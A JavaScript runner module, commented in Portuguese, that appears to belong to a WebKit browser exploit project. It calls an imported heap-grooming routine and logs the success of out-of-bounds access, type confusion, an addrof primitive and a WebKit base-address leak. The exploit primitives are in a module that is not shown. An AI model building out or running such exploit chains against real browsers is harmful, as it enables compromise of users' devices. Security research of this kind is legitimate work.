// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R45 - Corrupted Array Leak com Heap Grooming)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R45,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V84_CALHG_R45_WEBKIT
} from './testArrayBufferVictimCrash.mjs';


async function runCorruptedArrayGroomingStrategy_R45() {
    const FNAME_RUNNER = "runCorruptedArrayGroomingStrategy_R45";
    logS3(`==== INICIANDO Estratégia Corrupted Array com Heap Grooming (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R45();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V84_CALHG_R45_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R45: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        const addrofSuccess = result.addrof_result?.success;
        const webkitLeakSuccess = result.webkit_leak_result?.success;

        logS3(`  RUNNER R45: Completou. OOB usado: ${result.oob_value_used || 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R45: Teste Addrof: ${result.addrof_result.msg}`, addrofSuccess ? "vuln" : "warn", FNAME_RUNNER);
        logS3(`  RUNNER R45: Teste WebKit Base Leak: ${result.webkit_leak_result.msg}`, webkitLeakSuccess ? "vuln" : "warn", FNAME_RUNNER);

        if (webkitLeakSuccess) {
            document.title = `${module_name_for_title}_R45: WebKitLeak SUCCESS!`;
        } else if (addrofSuccess) {
            document.title = `${module_name_for_title}_R45: Addrof OK, WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R45: TC OK, Addrof Fail`;
        }

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R45: Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success;
                const webkitLeakSuccessThisIter = iter_sum.webkit_leak_result_this_iter?.success;
                let logMsg = `    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof=${addrofSuccessThisIter}, WebKitLeak=${webkitLeakSuccessThisIter}`;
                if (iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_R45: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia Corrupted Array com Heap Grooming (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_CALHG_R45_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runCorruptedArrayGroomingStrategy_R45();
    
    logS3(`\n==== Script (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
